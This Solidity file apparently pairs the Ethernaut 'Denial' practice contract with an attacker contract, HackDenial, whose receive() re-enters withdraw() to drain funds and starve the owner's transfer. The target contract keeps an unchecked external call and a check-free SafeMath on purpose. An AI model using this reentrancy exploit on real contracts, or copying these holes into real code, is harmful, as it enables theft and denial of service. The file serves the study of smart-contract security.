// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';
import "hardhat/console.sol";

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = payable(address(0xA9E));
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    constructor() payable public {

    }

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        (bool success, ) = partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract HackDenial {

    using SafeMath for uint256;

    Denial denial;

    constructor(address payable addr) public {
        denial = Denial(addr);
        denial.setWithdrawPartner(address(this));
    }

    function hack() external {
        denial.withdraw();
    }

    receive() external payable {
        assert(address(denial).balance.div(100) > 0);
        assert(gasleft() >= 12300);
        denial.withdraw();
    }

    // fallback() external {
    //     console.log("Denial balance: %s", address(denial).balance.div(100));

    //     if(address(denial).balance.div(100) > 0) {
    //         console.log("Denial balance: %s", address(denial).balance.div(100));
    //         denial.withdraw();
    //     }
    // }
}